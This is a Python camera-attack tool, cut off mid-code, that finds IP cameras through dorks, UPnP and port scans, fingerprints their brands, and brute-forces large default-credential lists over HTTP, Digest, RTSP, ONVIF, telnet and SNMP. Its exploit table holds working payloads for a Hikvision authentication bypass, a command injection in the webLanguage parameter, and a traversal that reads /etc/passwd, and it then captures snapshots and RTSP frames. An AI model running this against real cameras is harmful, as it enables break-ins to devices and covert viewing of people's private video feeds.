#!/usr/bin/env python3
"""
IP Cam Auditor v4.0 — Ultimate Edition
IP Camera Discovery · Fingerprinting · Exploit Check · Credential Audit

Author: HackerAI
License: For authorized security assessments only
"""

import asyncio
import argparse
import base64
import csv
import html
import hashlib
import ipaddress
import json
import os
import random
import re
import socket
import ssl
import struct
import subprocess
import sys
import textwrap
import threading
import time
import urllib.parse
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from io import StringIO

# ──────────────────────────────────────────────
# Optional import checks
# ──────────────────────────────────────────────

HAS_DNSPYTHON = False
try:
    import dns.resolver  # type: ignore
    HAS_DNSPYTHON = True
except ImportError:
    pass

HAS_ONVIF = False
try:
    from onvif import ONVIFCamera  # type: ignore
    HAS_ONVIF = True
except ImportError:
    pass

HAS_AIOHTTP = False
try:
    import aiohttp  # type: ignore
    HAS_AIOHTTP = True
except ImportError:
    pass

HAS_OPENCV = False
try:
    import cv2  # type: ignore
    HAS_OPENCV = True
except ImportError:
    pass

HAS_REQUESTS = False
try:
    import requests  # type: ignore
    HAS_REQUESTS = True
except ImportError:
    pass


# ──────────────────────────────────────────────
# Constants
# ──────────────────────────────────────────────

VERSION = "4.0"
BANNER = f"""
╔══════════════════════════════════════════════════╗
║         IP Cam Auditor v{VERSION} — Ultimate Edition    ║
║  IP Camera Discovery · Fingerprinting · Exploits  ║
╚══════════════════════════════════════════════════╝
"""

COMMON_PORTS = [80, 443, 554, 8080, 8443, 8899, 9000, 5540, 7001, 7010, 85, 81, 88, 8000, 7070, 1935, 37777, 37778, 34567, 34599, 65000, 9001, 5000, 5001, 6000, 6001, 4000, 4001, 2000, 2001]

RTSP_PORTS = [554, 5540, 8554, 7070, 1935, 5541, 5542]

HTTP_PORTS = [80, 443, 8080, 8443, 8899, 81, 88, 8000, 85, 7001, 9000]

ONVIF_PORTS = [80, 8080, 8899, 443, 8443, 5000, 5001, 6000, 6001]

SNMP_PORTS = [161, 162, 199, 391]

TELNET_PORTS = [23, 2323]

# ──────────────────────────────────────────────
# Color helpers
# ──────────────────────────────────────────────

def green(text):
    return f"\033[92m{text}\033[0m"

def red(text):
    return f"\033[91m{text}\033[0m"

def yellow(text):
    return f"\033[93m{text}\033[0m"

def blue(text):
    return f"\033[94m{text}\033[0m"

def cyan(text):
    return f"\033[96m{text}\033[0m"

def bold(text):
    return f"\033[1m{text}\033[0m"

def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def ts_filename():
    return datetime.now().strftime("%Y%m%d_%H%M%S")

# ──────────────────────────────────────────────
# Default credentials database
# ──────────────────────────────────────────────

DEFAULT_CREDS = {
    "hikvision": [
        ("admin", "12345"), ("admin", ""), ("admin", "admin"), ("admin", "123456"),
        ("admin", "111111"), ("admin", "666666"), ("admin", "888888"),
        ("admin", "password"), ("admin", "hikvision"), ("admin", "hik12345"),
        ("admin", "admin123"), ("admin", "12345678"), ("admin", "123456789"),
        ("admin", "1111111"), ("admin", "88888888"), ("admin", "66666666"),
        ("admin", "abcd1234"), ("admin", "hikvision123"), ("admin", "12345"),
        ("admin", "admin12345"), ("admin", "1"),
    ],
    "dahua": [
        ("admin", "admin"), ("admin", "123456"), ("admin", "666666"),
        ("admin", "888888"), ("admin", "password"), ("admin", "dahua"),
        ("admin", "dahua123"), ("admin", "1"), ("admin", "12345"),
        ("admin", "111111"), ("admin", ""), ("admin", "default"),
        ("admin", "Admin123"), ("admin", "dvr"), ("admin", "000000"),
    ],
    "axis": [
        ("root", "pass"), ("root", "axis"), ("root", ""), ("admin", "admin"),
        ("admin", "password"), ("root", "root"), ("root", "default"),
        ("root", "12345"), ("root", "passwd"), ("root", "axis123"),
    ],
    "bosch": [
        ("service", "service"), ("user", "user"), ("admin", "admin"),
        ("root", "root"), ("admin", "password"), ("bosch", "bosch"),
        ("admin", "Bosch"), ("service", "BoschService"),
    ],
    "panasonic": [
        ("admin", "12345"), ("admin", "password"), ("admin", "admin"),
        ("root", "pass"), ("admin", "panasonic"), ("admin", "123456"),
        ("guest", "guest"), ("user", "user"),
    ],
    "samsung": [
        ("admin", "1111111"), ("admin", "4321"), ("root", "root"),
        ("admin", "admin"), ("admin", "password"), ("admin", "samsung"),
        ("admin", "samsung123"), ("admin", "123456"),
    ],
    "sony": [
        ("admin", "admin"), ("admin", "sony"), ("admin", "12345"),
        ("root", "root"), ("user", "user"), ("admin", "password"),
    ],
    "tp-link": [
        ("admin", "admin"), ("admin", "password"), ("admin", "12345"),
        ("admin", ""), ("root", "root"), ("admin", "tp-link"),
        ("admin", "tp-link123"),
    ],
    "foscam": [
        ("admin", ""), ("admin", "password"), ("admin", "foscam"),
        ("admin", "12345"), ("admin", "admin"), ("root", "xc3511"),
        ("admin", "111111"), ("admin", "000000"),
    ],
    "acti": [
        ("admin", "12345"), ("admin", "admin"), ("admin", "password"),
        ("Admin", "123456"), ("root", "root"),
    ],
    "vivotek": [
        ("root", ""), ("root", "root"), ("admin", "admin"),
        ("admin", "password"), ("root", "vivotek"), ("admin", "vivotek"),
        ("root", "12345"),
    ],
    "ubiquiti": [
        ("ubnt", "ubnt"), ("admin", "ubnt"), ("root", "ubnt"),
        ("admin", "admin"), ("admin", "password"),
        ("ubnt", "password"),
    ],
    "honeywell": [
        ("admin", "1234"), ("admin", "admin"), ("admin", "password"),
        ("admin", "honeywell"), ("root", "honeywell"),
        ("admin", "12345"), ("admin", "default"),
    ],
    "geovision": [
        ("admin", "admin"), ("admin", "password"), ("admin", "geovision"),
        ("Admin", "1234"), ("root", "root"),
    ],
    "mobotix": [
        ("admin", "meinsm"), ("admin", "admin"), ("admin", "password"),
        ("root", "root"), ("admin", "mobotix"),
    ],
    "generic": [
        ("admin", "admin"), ("admin", "12345"), ("admin", "password"),
        ("admin", "123456"), ("admin", ""), ("root", "root"),
        ("admin", "111111"), ("admin", "888888"), ("admin", "666666"),
        ("admin", "12345678"), ("admin", "123456789"), ("admin", "000000"),
        ("root", "12345"), ("root", "admin"), ("root", ""),
        ("user", "user"), ("guest", "guest"), ("admin", "pass"),
        ("admin", "default"), ("admin", "letmein"),
        ("admin", "admin123"), ("admin", "admin123456"),
    ],
}

# ──────────────────────────────────────────────
# Brand fingerprint patterns
# ──────────────────────────────────────────────

BRAND_PATTERNS = {
    "hikvision": {
        "body": [b"Hikvision", b"iVMS", b"WEBCOMP", b"hikiOS", b"hik-linux"],
        "server": [b"Hikvision", b"hikvision_web", b"IVMS"],
        "title": [b"HIKVISION", b"iVMS-4200", b"hikvision"],
    },
    "dahua": {
        "body": [b"Dahua", b"dahua", b"DH-", b"WEB Client", b"DVR Client"],
        "server": [b"Dahua", b"dahua_web", b"DVR_"],
        "title": [b"Dahua", b"DAHUA", b"WEB Client"],
    },
    "axis": {
        "body": [b"Axis", b"axis-", b"AXIS", b"axis_com"],
        "server": [b"Axis", b"axis_cam"],
        "title": [b"Axis", b"AXIS"],
    },
    "bosch": {
        "body": [b"Bosch", b"BOSCH", b"Video Management", b"VMS"],
        "server": [b"Bosch", b"bosch_"],
        "title": [b"Bosch", b"BOSCH", b"VIP"],
    },
    "panasonic": {
        "body": [b"Panasonic", b"WV-", b"panasonic"],
        "server": [b"Panasonic", b"panasonic_"],
        "title": [b"Panasonic", b"WV-", b"Network Camera"],
    },
    "samsung": {
        "body": [b"Samsung", b"samsung", b"SNP-", b"SNZ-"],
        "server": [b"Samsung", b"samsung_"],
        "title": [b"Samsung", b"SAMSUNG"],
    },
    "sony": {
        "body": [b"Sony", b"sony", b"SNC-"],
        "server": [b"Sony"],
        "title": [b"Sony", b"SNC-"],
    },
    "tp-link": {
        "body": [b"TP-LINK", b"tp-link", b"TL-IPC"],
        "server": [b"TP-LINK", b"tp-link"],
        "title": [b"TP-LINK", b"TL-IPC"],
    },
    "foscam": {
        "body": [b"Foscam", b"foscam", b"FOSCAM"],
        "server": [b"Foscam"],
        "title": [b"Foscam", b"FOSCAM"],
    },
    "acti": {
        "body": [b"ACTi", b"acti", b"ACM-"],
        "server": [b"ACTi"],
        "title": [b"ACTi", b"ACM-"],
    },
    "vivotek": {
        "body": [b"VIVOTEK", b"vivotek", b"VIVO"],
        "server": [b"Vivotek", b"vivotek"],
        "title": [b"VIVOTEK", b"VIVO"],
    },
    "ubiquiti": {
        "body": [b"Ubiquiti", b"ubiquiti", b"airVision", b"UniFi"],
        "server": [b"Ubiquiti", b"ubiquiti"],
        "title": [b"Ubiquiti", b"UniFi", b"airVision"],
    },
    "honeywell": {
        "body": [b"Honeywell", b"honeywell", b"HRDP"],
        "server": [b"Honeywell"],
        "title": [b"Honeywell", b"HONEYWELL"],
    },
    "geovision": {
        "body": [b"GeoVision", b"geovision", b"GV-"],
        "server": [b"GeoVision"],
        "title": [b"GeoVision", b"GV-"],
    },
    "mobotix": {
        "body": [b"Mobotix", b"mobotix", b"Mx-"],
        "server": [b"Mobotix"],
        "title": [b"Mobotix", b"Mx-"],
    },
    "cctv": {
        "body": [b"CCTV", b"cctv", b"DVR", b"NVR", b"IP Camera"],
        "server": [b"DVR", b"NVR"],
    },
}

# ──────────────────────────────────────────────
# Google Dorks for camera discovery
# ──────────────────────────────────────────────

GOOGLE_DORKS = [
    'intitle:"HIKVISION" inurl:"doc/page/login.asp"',
    'intitle:"Dahua" inurl:"login.asp"',
    'intitle:"AXIS" inurl:"view/view.shtml"',
    'intitle:"WAN IP Camera"',
    'intitle:"IP Camera" inurl:"login.htm"',
    'intitle:"Live View" "IP Camera"',
    'intitle:"Network Camera" "login"',
    'intitle:"WEB Client" inurl:"login"',
    'intitle:"ONVIF" inurl:"login"',
    'intitle:"RTSP" "Camera"',
    'intitle:"Video Server" inurl:"login"',
    'intitle:"DVR" "login" -shop',
    'inurl:"cam/realmonitor"',
    'inurl:"cgi-bin/snapshot.cgi"',
    'inurl:"axis-cgi/jpg/image.cgi"',
    'inurl:"viewer/live/index.html"',
    'inurl:"web/viewer.html" camera',
    'inurl:"stream/channel" camera',
    'inurl:"live" "camera" "rtsp"',
    'intitle:"Mobotix" inurl:"control"',
    'intitle:"TP-LINK" "Camera"',
    'intitle:"FOSCAM" inurl:"login"',
    'intitle:"VIVOTEK" inurl:"login"',
    'intitle:"ACTi" inurl:"login"',
    'intitle:"Sony" "SNC-" inurl:"view"',
    'intitle:"Panasonic" "WV-" inurl:"view"',
    'intitle:"Bosch" "VIP" inurl:"view"',
    'intitle:"Samsung" "SNP-" inurl:"view"',
    'intitle:"Ubiquiti" "airVision"',
    'intitle:"GeoVision" "GV-" inurl:"view"',
]

# ──────────────────────────────────────────────
# Exploit checks database
# ──────────────────────────────────────────────

EXPLOIT_CHECKS = {
    "hikvision": [
        {
            "cve": "CVE-2017-7921",
            "description": "Hikvision Authentication Bypass",
            "severity": "CRITICAL",
            "url": "/onvif-http/snapshot?auth=YWRtaW46MTIzNDU=",
            "method": "GET",
            "check": lambda r: r and r.status < 400,
            "detail": "Access snapshot without authentication via base64-encoded creds",
        },
        {
            "cve": "CVE-2021-36260",
            "description": "Hikvision Command Injection",
            "severity": "CRITICAL",
            "url": f"/SDK/webLanguage?language=|echo%20VULNERABLE||",
            "method": "GET",
            "check": lambda r: r and b"VULNERABLE" in (r.content if hasattr(r, 'content') else r),
            "detail": "Command injection in webLanguage parameter",
        },
        {
            "cve": "CVE-2017-12557",
            "description": "Hikvision Directory Traversal",
            "severity": "HIGH",
            "url": "/onvif-http/../../../../../../../../../etc/passwd",
            "method": "GET",
            "check": lambda r: r and b"root:" in (r.content if hasattr(r, 'content') else r),
            "detail": "Directory traversal via ONVIF interface",
        },
        {
            "cve": "CVE-2014-4862",
            "description": "Hikvision Backdoor Account",
            "severity": "CRITICAL",
            "url": "/",
            "method": "GET",
            "check": lambda r: False,
            "detail": "Backdoor account 'dreambox' with password 'dreambox' on older firmware",
        },
    ],
    "dahua": [
        {
            "cve": "CVE-2020-7592",
            "description": "Dahua Account Enumeration",
            "severity": "MEDIUM",
            "url": "/RPC2",
            "method": "POST",
            "check": lambda r: r and r.status != 404,
            "detail": "RPC endpoint allows user enumeration",
        },
        {
            "cve": "CVE-2018-11479",
            "description": "Dahua Information Disclosure",
            "severity": "HIGH",
            "url": "/current_config/config.xml",
            "method": "GET",
            "check": lambda r: r and b"<config" in (r.content if hasattr(r, 'content') else r),
            "detail": "Exposes sensitive configuration including passwords",
        },
    ],
}

# Combined exploit checks
ALL_EXPLOIT_CHECKS = {}
for brand, checks in EXPLOIT_CHECKS.items():
    for check in checks:
        ALL_EXPLOIT_CHECKS.setdefault(brand, []).append(check)


# ──────────────────────────────────────────────
# Network helpers
# ──────────────────────────────────────────────

def http_get(url, timeout=10, auth=None, proxy=None, headers_extra=None):
    """Make an HTTP GET request with optional auth and proxy."""
    try:
        if HAS_REQUESTS:
            sess = requests.Session()
            sess.verify = False
            if proxy:
                sess.proxies = {"http": proxy, "https": proxy}
            headers = {"User-Agent": "Mozilla/5.0 (compatible; IPCamAuditor/4.0)"}
            if headers_extra:
                headers.update(headers_extra)
            if auth:
                resp = sess.get(url, auth=auth, headers=headers, timeout=timeout, allow_redirects=True)
            else:
                resp = sess.get(url, headers=headers, timeout=timeout, allow_redirects=True)
            return resp.status_code, dict(resp.headers), resp.content, resp.content
        else:
            req = urllib.request.Request(url)
            req.add_header("User-Agent", "Mozilla/5.0 (compatible; IPCamAuditor/4.0)")
            if headers_extra:
                for k, v in headers_extra.items():
                    req.add_header(k, v)
            if auth:
                credentials = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
                req.add_header("Authorization", f"Basic {credentials}")
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            if proxy:
                proxy_handler = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
                opener = urllib.request.build_opener(proxy_handler)
                resp = opener.open(req, timeout=timeout, context=ctx)
            else:
                resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
            content = resp.read()
            return resp.status, dict(resp.headers), content, content
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read(), e.read()
    except requests.exceptions.RequestException as e:
        if hasattr(e, 'response') and e.response:
            return e.response.status_code, dict(e.response.headers), e.response.content, e.response.content
        return None, {}, b"", b""
    except Exception as e:
        return None, {}, b"", str(e).encode()


def http_post(url, data, timeout=10, auth=None, proxy=None):
    """Make an HTTP POST request."""
    try:
        if HAS_REQUESTS:
            sess = requests.Session()
            sess.verify = False
            if proxy:
                sess.proxies = {"http": proxy, "https": proxy}
            headers = {"User-Agent": "Mozilla/5.0 (compatible; IPCamAuditor/4.0)"}
            if auth:
                resp = sess.post(url, data=data, auth=auth, headers=headers, timeout=timeout)
            else:
                resp = sess.post(url, data=data, headers=headers, timeout=timeout)
            return resp.status_code, dict(resp.headers), resp.content, resp.content
        else:
            data_bytes = data.encode() if isinstance(data, str) else data
            req = urllib.request.Request(url, data=data_bytes)
            req.add_header("User-Agent", "Mozilla/5.0 (compatible; IPCamAuditor/4.0)")
            if auth:
                credentials = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
                req.add_header("Authorization", f"Basic {credentials}")
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            if proxy:
                proxy_handler = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
                opener = urllib.request.build_opener(proxy_handler)
                resp = opener.open(req, timeout=timeout, context=ctx)
            else:
                resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
            content = resp.read()
            return resp.status, dict(resp.headers), content, content
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read(), e.read()
    except Exception as e:
        return None, {}, b"", str(e).encode()


# ──────────────────────────────────────────────
# Brand fingerprinting
# ──────────────────────────────────────────────

def fingerprint_brand(ip, port, timeout=10, proxy=None):
    """Identify camera brand from HTTP response."""
    proto = "https" if port in (443, 8443) else "http"
    url = f"{proto}://{ip}:{port}/"
    
    status, headers, body, raw = http_get(url, timeout=timeout, proxy=proxy)
    if status is None:
        return "Unknown", "generic"
    
    server = headers.get("Server", "")
    title_match = re.search(b"<title>(.*?)</title>", body, re.IGNORECASE)
    title = title_match.group(1) if title_match else b""
    
    scores = {}
    for brand, patterns in BRAND_PATTERNS.items():
        score = 0
        for pattern in patterns.get("body", []):
            if pattern in body:
                score += 2
        for pattern in patterns.get("server", []):
            if pattern.lower() in server.lower():
                score += 3
        for pattern in patterns.get("title", []):
            if pattern in title:
                score += 2
        if score > 0:
            scores[brand] = score
    
    if scores:
        best_brand = max(scores, key=scores.get)
        brand_display = best_brand.capitalize()
        return brand_display, best_brand
    
    # Check URL patterns
    for brand in ["hikvision", "dahua", "axis", "foscam", "vivotek"]:
        if brand in url.lower() or brand in str(body).lower()[:500]:
            return brand.capitalize(), brand
    
    return "Unknown", "generic"


def fingerprint_from_rtsp(ip, port=554, timeout=10):
    """Try to fingerprint brand from RTSP response."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        
        # Send OPTIONS request
        options_req = f"OPTIONS rtsp://{ip}:{port} RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: IPCamAuditor\r\n\r\n"
        s.send(options_req.encode())
        resp = s.recv(4096)
        s.close()
        
        resp_str = resp.decode("utf-8", errors="replace")
        
        if "Hikvision" in resp_str:
            return "Hikvision", "hikvision"
        if "Dahua" in resp_str or "DH-" in resp_str:
            return "Dahua", "dahua"
        if "Axis" in resp_str:
            return "Axis", "axis"
        if "Foscam" in resp_str:
            return "Foscam", "foscam"
        if "TP-LINK" in resp_str:
            return "TP-Link", "tp-link"
        
        return None, None
    except Exception:
        return None, None


# ──────────────────────────────────────────────
# Authentication testers
# ──────────────────────────────────────────────

def test_http_auth(ip, port, username, password, timeout=10, proxy=None):
    """Test HTTP Basic authentication on common camera endpoints."""
    proto = "https" if port in (443, 8443) else "http"
    endpoints = [
        "/", "/index.html", "/login.html", "/login.asp", "/login.cgi",
        "/login.htm", "/web/login.html", "/cgi-bin/login.cgi",
        "/cgi-bin/guest/Login.cgi", "/api/login", "/api/v1/login",
        "/ISAPI/Security/userCheck",
    ]
    
    for ep in endpoints:
        url = f"{proto}://{ip}:{port}{ep}"
        status, headers, body, raw = http_get(url, timeout=timeout, auth=(username, password), proxy=proxy)
        if status and status < 400 and status != 401:
            # Success! Check we got meaningful content
            if len(body) > 50 and b"error" not in body[:200].lower():
                return True, status, f"HTTP Basic auth success on {ep}"
    
    return False, None, "No HTTP auth"


def test_digest_auth(ip, port, username, password, timeout=10, proxy=None):
    """Test HTTP Digest authentication."""
    proto = "https" if port in (443, 8443) else "http"
    url = f"{proto}://{ip}:{port}/"
    
    try:
        status, headers, body, raw = http_get(url, timeout=timeout, proxy=proxy)
        if status == 401:
            auth_header = headers.get("WWW-Authenticate", "")
            if "Digest" in auth_header:
                # Parse realm and nonce
                realm_match = re.search(r'realm="([^"]+)"', auth_header)
                nonce_match = re.search(r'nonce="([^"]+)"', auth_header)
                if realm_match and nonce_match:
                    realm = realm_match.group(1)
                    nonce = nonce_match.group(1)
                    # Calculate Digest response
                    ha1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
                    ha2 = hashlib.md5(f"GET:/".encode()).hexdigest()
                    response = hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
                    
                    auth_value = f'Digest username="{username}", realm="{realm}", nonce="{nonce}", uri="/", response="{response}"'
                    headers_extra = {"Authorization": auth_value}
                    status2, headers2, body2, raw2 = http_get(url, timeout=timeout, headers_extra=headers_extra, proxy=proxy)
                    if status2 and status2 < 400 and status2 != 401:
                        return True, status2, "Digest auth success"
    except Exception:
        pass
    
    return False, None, "No Digest auth"


def test_rtsp_auth(ip, port, username, password, timeout=10):
    """Test RTSP authentication."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        
        auth_str = base64.b64encode(f"{username}:{password}".encode()).decode()
        req = f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {auth_str}\r\nUser-Agent: IPCamAuditor\r\nAccept: application/sdp\r\n\r\n"
        s.send(req.encode())
        resp = s.recv(4096).decode("utf-8", errors="replace")
        s.close()
        
        if "200 OK" in resp or "200" in resp[:20]:
            return True, f"RTSP auth success ({resp[:100]})"
        return False, "RTSP auth failed"
    except Exception as e:
        return False, f"RTSP error: {e}"


def test_onvif_auth(ip, port, username, password, timeout=10):
    """Test ONVIF authentication via SOAP requests."""
    if not HAS_ONVIF:
        return False, {"error": "ONVIF library not installed"}
    
    try:
        camera = ONVIFCamera(ip, port, username, password, wsdl_dir=None, no_cache=True)
        camera.devicemgr.GetDeviceInformation()
        return True, {"status": "ONVIF auth success"}
    except Exception as e:
        return False, {"error": str(e)}


# ──────────────────────────────────────────────
# SNMP check
# ──────────────────────────────────────────────

def check_snmp(ip, port=161, timeout=5):
    """Check SNMP with common community strings."""
    communities = ["public", "private", "admin", "default", "read", "write", "monitor", "manager", "community", "password", "secret", "", "internal", "management", "user", "all", "world", "system", "oper"]
    results = []
    
    for community in communities:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            
            # SNMP GET request for sysDescr (1.3.6.1.2.1.1.1.0)
            # Build SNMP v1 packet
            pdu = _build_snmp_get(community, "1.3.6.1.2.1.1.1.0")
            sock.sendto(pdu, (ip, port))
            
            data, addr = sock.recvfrom(4096)
            sock.close()
            
            if data and len(data) > 20:
                # Try to extract system description
                try:
                    desc = data.decode("utf-8", errors="replace")
                except Exception:
                    desc = str(data[:100])
                results.append({"community": community, "system_description": desc})
        except Exception:
            pass
    
    return results


def _build_snmp_get(community, oid):
    """Build a simple SNMP v1 GET packet."""
    # SNMP v1 header
    community_bytes = community.encode()
    
    # Simple SNMP packet construction
    # Version (0 = v1)
    version = b"\x02\x01\x00"
    # Community
    comm = b"\x04" + bytes([len(community_bytes)]) + community_bytes
    
    # PDU type: 0xa0 = GetRequest
    # Request ID
    req_id = b"\x02\x01\x01"
    # Error status
    err_status = b"\x02\x01\x00"
    # Error index
    err_index = b"\x02\x01\x00"
    
    # Variable bindings
    oid_parts = [int(x) for x in oid.split(".")]
    oid_bytes = b"\x06" + bytes([len(oid_parts)]) + bytes(oid_parts)
    value = b"\x05\x00"  # NULL value for GET
    varbind = b"\x30" + bytes([len(oid_bytes) + len(value)]) + oid_bytes + value
    varbinds = b"\x30" + bytes([len(varbind)]) + varbind
    
    pdu = b"\xa0" + bytes([len(req_id) + len(err_status) + len(err_index) + len(varbinds)]) + req_id + err_status + err_index + varbinds
    
    # Wrap in sequence
    inner = version + comm + pdu
    packet = b"\x30" + bytes([len(inner)]) + inner
    
    return packet


# ──────────────────────────────────────────────
# Telnet check
# ──────────────────────────────────────────────

def check_telnet(ip, port=23, timeout=10):
    """Check if telnet is open and grab banner."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        banner = s.recv(1024)
        s.close()
        return True, banner.decode("utf-8", errors="replace")
    except Exception:
        return False, ""


def try_telnet_login(ip, port, username, password, timeout=10):
    """Try to login via telnet."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        
        # Wait for prompt
        time.sleep(0.5)
        data = s.recv(4096)
        
        # Send username
        if b"login:" in data or b"Username:" in data or b"user:" in data:
            s.send(f"{username}\n".encode())
            time.sleep(0.3)
            data = s.recv(4096)
            
            # Send password
            if b"Password:" in data or b"password:" in data or b"pass:" in data:
                s.send(f"{password}\n".encode())
                time.sleep(0.3)
                data = s.recv(4096)
                
                # Check for shell prompt
                if b"#" in data or b"$" in data or b"Welcome" in data or b"login" in data:
                    s.close()
                    return True, data.decode("utf-8", errors="replace")[:200]
        
        s.close()
        return False, ""
    except Exception:
        return False, ""


# ──────────────────────────────────────────────
# UPnP Discovery
# ──────────────────────────────────────────────

def upnp_discover(timeout=3):
    """Discover UPnP devices on the local network."""
    results = []
    m_search = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "MX: 2\r\n"
        "ST: urn:schemas-upnp-org:device:MediaServer:1\r\n"
        "\r\n"
    )
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.settimeout(timeout)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    try:
        sock.sendto(m_search.encode(), ("239.255.255.250", 1900))
        start = time.time()
        while time.time() - start < timeout:
            try:
                data, addr = sock.recvfrom(2048)
                data_str = data.decode("utf-8", errors="replace")
                if "LOCATION:" in data_str:
                    loc_m = re.search(r'LOCATION:\s*(\S+)', data_str, re.IGNORECASE)
                    if loc_m:
                        results.append({"ip": addr[0], "location": loc_m.group(1), "raw": data_str[:300]})
            except socket.timeout:
                break
    except Exception:
        pass
    finally:
        sock.close()
    return results


# ──────────────────────────────────────────────
# MJPEG / Snapshot Capture
# ──────────────────────────────────────────────

def capture_snapshot(ip, port, username="admin", password="", timeout=10):
    """Try to capture a snapshot from the camera."""
    proto = "https" if port in (443, 8443) else "http"
    
    urls = [
        f"{proto}://{ip}:{port}/onvif-http/snapshot",
        f"{proto}://{ip}:{port}/ISAPI/Streaming/channels/1/picture",
        f"{proto}://{ip}:{port}/cgi-bin/snapshot.cgi",
        f"{proto}://{ip}:{port}/snapshot.jpg",
        f"{proto}://{ip}:{port}/image.jpg",
        f"{proto}://{ip}:{port}/capture",
        f"{proto}://{ip}:{port}/tmpfs/snap.jpg",
        f"{proto}://{ip}:{port}/cgi-bin/jpg/image.cgi",
        f"{proto}://{ip}:{port}/mjpeg/snapshot",
        f"{proto}://{ip}:{port}/axis-cgi/jpg/image.cgi",
    ]
    
    for url in urls:
        status, headers, body, raw = http_get(url, timeout=timeout, auth=(username, password))
        if status and status < 400:
            if len(raw) > 1000:
                if raw[:2] == b'\xff\xd8':
                    return True, raw, f"JPEG snapshot ({len(raw)} bytes)"
                if b"JFIF" in raw[:100] or b"Exif" in raw[:100]:
                    return True, raw, f"JPEG snapshot ({len(raw)} bytes)"
                if b"--jpgboundary" in raw or b"Content-Type: image/jpeg" in raw:
                    return True, raw, "MJPEG stream detected"
    return False, b"", "No snapshot accessible"


def try_rtsp_stream(ip, port, username="admin", password="", timeout=10):
    """Try to connect to RTSP stream and grab a frame."""
    if not HAS_OPENCV:
        return False, None, "OpenCV not installed"
    
    rtsp_urls = [
        f"rtsp://{username}:{password}@{ip}:{port}/h264Preview_01_main",
        f"rtsp://{username}:{password}@{ip}:{port}/h264Preview_01_sub",
        f"rtsp://{username}:{password}@{ip}:{port}/live",
        f"rtsp://{username}:{password}@{ip}:{port}/live/main",
        f"rtsp://{username}:{password}@{ip}:{port}/video1",
        f"rtsp://{username}:{password}@{ip}:{port}/cam/realmonitor?channel=1&subtype=0",
        f"rtsp://{username}:{password}@{ip}:{port}/Streaming/Channels/101",
        f"rtsp://{username}:{password}@{ip}:{port}/axis-media/media.amp",
        f"rtsp://{username}:{password}@{ip}:{port}/media/video1",
    ]
    
    for rtsp_url in rtsp_urls:
        try:
            cap = cv2.VideoCapture(rtsp_url, cv2.CAP_FFMPEG)
            cap.set(cv2.CAP_PROP_OPEN_TIMEOUT_MSEC, timeout * 1000)
            cap.set(cv2.CAP_PROP_READ_TIMEOUT_MSEC, timeout * 1000)
            if cap.isOpened():
                ret, frame = cap.read()
                cap.release()
                if ret and frame is not None and frame.size > 0:
                    return True, frame, f"RTSP frame captured ({frame.shape})"
        except Exception:
            pass
    return False, None, "No RTSP stream accessible"


# ──────────────────────────────────────────────
# NTLM / Pass-the-Hash Detection
# ──────────────────────────────────────────────

def check_ntlm(ip, port, timeout=5):
    """Check if the camera supports NTLM authentication."""
    proto = "https" if port in (443, 8443) else "http"
    url = f"{proto}://{ip}:{port}/"
    try:
        if HAS_REQUESTS:
            sess = requests.Session()
            sess.verify = False
            resp = sess.get(url, timeout=timeout)
            auth_header = resp.headers.get("WWW-Authenticate", "")
            if "NTLM" in auth_header:
                return True, "NTLM authentication supported"
            if "Negotiate" in auth_header:
                return True, "Negotiate (Kerberos/NTLM) authentication supported"
        else:
            req = urllib.request.Request(url)
            req.add_header("User-Agent", "Mozilla/5.0")
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            try:
                resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
            except urllib.error.HTTPError as e:
                auth_header = e.headers.get("WWW-Authenticate", "")
                if "NTLM" in auth_header:
                    return True, "NTLM authentication supported"
    except Exception:
        pass
    return False, "No NTLM detected"


# ──────────────────────────────────────────────
# Exploit Runner
# ──────────────────────────────────────────────

def run_all_exploit_checks(ip, port, brand_key, timeout=10, proxy=None):
    """Run all exploit checks for the given brand."""
    proto = "https" if port in (443, 8443) else "http"
    found = []
    
    checks = ALL_EXPLOIT_CHECKS.get(brand_key, [])
    
    for check in checks:
        url = f"{proto}://{ip}:{port}{check['url']}"
        try:
            if check["method"] == "GET":
                status, headers, body, raw = http_get(url, timeout=timeout, proxy=proxy)
                # Simulate response object
                class MockResponse:
                    def __init__(self, status_code, content, headers):
                        self.status_code = status_code
                        self.status = status_code
                        self.content = content
                        self.headers = headers
                resp = MockResponse(status, body, headers)
                if status and check["check"](resp):
                    found.append(check)
            elif check["method"] == "POST":
                status, headers, body, raw = http_post(url, "test", timeout=timeout, proxy=proxy)
                class MockResponse:
                    def __init__(self, status_code, content, headers):
